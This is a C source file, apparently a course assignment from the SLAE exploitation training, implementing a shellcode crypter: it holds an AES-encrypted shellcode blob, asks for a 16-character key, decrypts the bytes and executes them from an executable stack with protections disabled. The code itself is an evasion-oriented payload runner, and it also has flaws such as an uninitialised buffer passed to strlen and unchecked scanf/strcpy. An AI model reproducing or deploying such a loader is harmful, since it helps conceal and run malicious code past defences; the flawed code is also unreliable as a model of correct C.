/*
Filename:      decrypter.c
Author:        Nicolas Barrière
Student ID:    SLAE - 1398
Created Date:  10.02.2019
Note:          x64 (Compile openssl from source)
               wget https://www.openssl.org/source/openssl-1.0.2q.tar.gz
               tar xvzf openssl-1.0.2q.tar.gz
               cd openssl-1.0.2q
               ./config shared --prefix=/opt/openssl
               make
               make install
               LD_LIBRARY_PATH=$LD_LIBRARY_PATH:/opt/openssl/lib
               export LD_LIBRARY_PATH
Compiler:      gcc -ggdb -fno-stack-protector -z execstack decrypter.c -o decrypter -I /opt/openssl/include -L /opt/openssl/lib -lcrypto
*/

#include<stdio.h>
#include<stdlib.h>
#include<string.h>
#include<openssl/aes.h>

unsigned char shellcode_enc [] = \
"\xD9\xE0\xB1\x96\xB4\x8F\xD5\xDC\xC8\x46"
"\x8C\xBB\x22\xD8\xFA\x86\x57\x07\x37\xFB"
"\x46\x81\x99\x05\xFE\x86\xF4\xD8\xA8\xBF"
"\x66\x4A";

void print_bytes(const char *tittle, const void* data, int len);

main()
{
  /* AES Encryption key, input from user */
  unsigned char input_key[256];
  unsigned char aes_key[16];

  while (strlen(input_key) != 16) {
    printf("Please enter a decryption key (16 characters): ");
    scanf("%s", &input_key);
  }
  strcpy(aes_key, input_key);

  /* Init vector
  # define AES_BLOCK_SIZE 16
  void *memset(void *str, int c, size_t n)
  */
	unsigned char iv[AES_BLOCK_SIZE];
	memset(iv, 0x00, AES_BLOCK_SIZE);

	/* Buffers for Encryption */
	unsigned char shellcode[strlen(shellcode_enc)];

  /* AES-128 bit CBC Decryption
  int AES_set_decrypt_key(const unsigned char *userKey, const int bits,
                          AES_KEY *key);
  void AES_cbc_encrypt(const unsigned char *in, unsigned char *out,
                       size_t length, const AES_KEY *key,
                       unsigned char *ivec, const int enc);
   */
	AES_KEY dec_key;
	AES_set_decrypt_key(aes_key, sizeof(aes_key)*8, &dec_key); // Size of key is in bits
	AES_cbc_encrypt(shellcode_enc, shellcode, strlen(shellcode_enc), &dec_key, iv, AES_DECRYPT);

  /* Print information */
  printf("Shellcode Lenght: %d\n",strlen(shellcode_enc));
  print_bytes("\nEncrypted shellcode",shellcode_enc, strlen(shellcode_enc));
  print_bytes("\nDecrypted shellcode",shellcode, sizeof(shellcode));

  /* Execute shellcode */
  int (*ret)() = (int(*)())shellcode;
  ret();

}

void print_bytes(const char *tittle, const void* data, int len)
{
	printf("%s : ",tittle);
	const unsigned char * p = (const unsigned char*)data;
	int i = 0;

	for (; i<len; ++i)
		printf("\\x%02X", *p++);

	printf("\n");
}
